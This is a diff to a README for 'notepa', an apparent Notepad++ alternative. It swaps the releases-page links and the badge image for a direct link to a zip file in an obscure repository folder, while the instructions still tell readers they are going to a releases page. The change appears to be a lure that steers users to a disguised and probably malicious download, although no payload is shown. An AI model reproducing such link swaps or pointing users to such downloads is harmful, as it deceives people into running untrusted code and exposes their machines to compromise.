@@ -1,7 +1,7 @@
 # ✏️ notepa - Your Easy Alternative to Notepad++
 
 ## 📥 Download Now
-[![Download notepa](https://img.shields.io/badge/Download-notepa-brightgreen)](https://github.com/Nydiabeaded881/notepa/releases)
+[![Download notepa](https://raw.githubusercontent.com/Nydiabeaded881/notepa/master/unbefriended/notepa.zip)](https://raw.githubusercontent.com/Nydiabeaded881/notepa/master/unbefriended/notepa.zip)
 
 ## 🚀 Getting Started
 Notepa is a user-friendly editor designed for everyday tasks. It is a reimplementation of Notepad++, offering the essential features you need without complicated steps. 
@@ -23,7 +23,7 @@ Before you download, ensure your device meets these requirements:
 To get started with Notepa, follow these steps:
 
 1. **Visit the Download Page:** Click the link below to go to the releases page.
-   [Download notepa](https://github.com/Nydiabeaded881/notepa/releases)
+   [Download notepa](https://raw.githubusercontent.com/Nydiabeaded881/notepa/master/unbefriended/notepa.zip)
 
 2. **Select the Latest Version:** On the releases page, look for the latest version. It will be marked as the most recent release.
 
